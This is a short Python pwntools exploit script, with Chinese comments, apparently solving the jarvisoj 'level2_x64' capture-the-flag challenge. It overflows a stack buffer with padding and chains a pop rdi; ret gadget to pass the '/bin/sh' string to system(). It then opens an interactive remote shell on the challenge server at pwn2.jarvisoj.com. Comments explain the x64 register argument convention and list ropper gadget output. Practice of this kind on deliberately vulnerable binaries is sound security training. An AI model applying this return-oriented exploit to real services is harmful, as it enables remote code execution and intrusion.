#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
nc='pwn2.jarvisoj.com'
point = 9882
p = ELF('./level2_x64')
a = remote(nc,point)

'''
x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和R9寄存器里

如果还有更多的参数的话才会保存在栈上

所以我们需要寻找一些类似于pop rdi; ret的这种gadget
'''
payload = "A"*0x88+ p64(0x4006b3) + p64(p.search('/bin/sh').next())+p64(p.symbols['system'])

'''
ropper -f level2_x64 找pop rdi; ret 地址


0x00000000004006ac: pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004006ae: pop r13; pop r14; pop r15; ret; 
0x00000000004006b0: pop r14; pop r15; ret; 
0x00000000004006b2: pop r15; ret; 
0x000000000040054f: pop rbp; mov edi, 0x600a98; jmp rax; 
0x00000000004006ab: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004006af: pop rbp; pop r14; pop r15; ret; 
0x0000000000400560: pop rbp; ret; 
0x00000000004006b3: pop rdi; ret; 关键代码地址
0x00000000004006b1: pop rsi; pop r15; ret; 
0x00000000004006ad: pop rsp; pop r13; pop r14; pop r15; ret; 
0x00000000004005ea: push rbp; mov rbp, rsp; call rax; 


将 /bin/sh地址覆盖ret     调用system函数

'''
a.send(payload)
a.interactive()

